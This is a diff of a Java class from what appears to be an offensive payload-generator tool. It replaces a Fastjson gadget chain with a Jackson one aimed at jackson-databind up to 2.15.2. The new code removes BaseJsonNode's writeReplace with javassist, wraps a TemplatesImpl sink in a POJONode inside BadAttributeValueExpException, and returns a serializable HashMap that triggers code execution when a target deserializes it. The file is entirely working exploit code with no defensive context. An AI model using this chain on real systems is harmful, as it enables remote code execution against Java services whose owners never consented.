@@ -1,6 +1,6 @@
 package com.ppp.chain.json;
 
-import com.alibaba.fastjson.JSONArray;
+import com.fasterxml.jackson.databind.node.POJONode;
 import com.ppp.ObjectPayload;
 import com.ppp.annotation.Authors;
 import com.ppp.annotation.Dependencies;
@@ -10,6 +10,9 @@ import com.ppp.sinks.SinkScheduler;
 import com.ppp.sinks.SinksHelper;
 import com.ppp.sinks.annotation.Sink;
 import com.ppp.utils.Reflections;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtMethod;
 
 import javax.management.BadAttributeValueExpException;
 import java.util.HashMap;
@@ -17,13 +20,13 @@ import java.util.HashMap;
 /**
  * @author Whoopsunix
  */
-@Dependencies({"com.alibaba:fastjson:<=1.2.83"})
-@Authors({Authors.Y4tacker, Authors.oneueo})
+@Dependencies({"com.fasterxml.jackson.core:jackson-databind:<=2.15.2"})
+@Authors({Authors.Y4ER})
 @Sink({Sink.TemplatesImpl})
-public class FastJson implements ObjectPayload<Object> {
+public class Jackson implements ObjectPayload<Object> {
 
     public static void main(String[] args) throws Exception {
-        PayloadRunner.run(FastJson.class, args);
+        PayloadRunner.run(Jackson.class, args);
     }
 
     public Object getObject(SinksHelper sinksHelper) throws Exception {
@@ -42,14 +45,20 @@ public class FastJson implements ObjectPayload<Object> {
     }
 
     public Object getChain(Object templates) throws Exception {
-        JSONArray jsonArray = new JSONArray();
-        jsonArray.add(templates);
+        // 将修改后的CtClass加载至当前线程的上下文类加载器中
+        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
+        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
+        ctClass.removeMethod(writeReplace);
+        ctClass.toClass();
 
-        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
-        Reflections.setFieldValue(bd, "val", jsonArray);
+        POJONode node = new POJONode(templates);
+
+        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
+        Reflections.setFieldValue(badAttributeValueExpException, "val", node);
 
         HashMap hashMap = new HashMap();
-        hashMap.put(templates, bd);
+        hashMap.put(templates, badAttributeValueExpException);
+
         return hashMap;
     }
 }
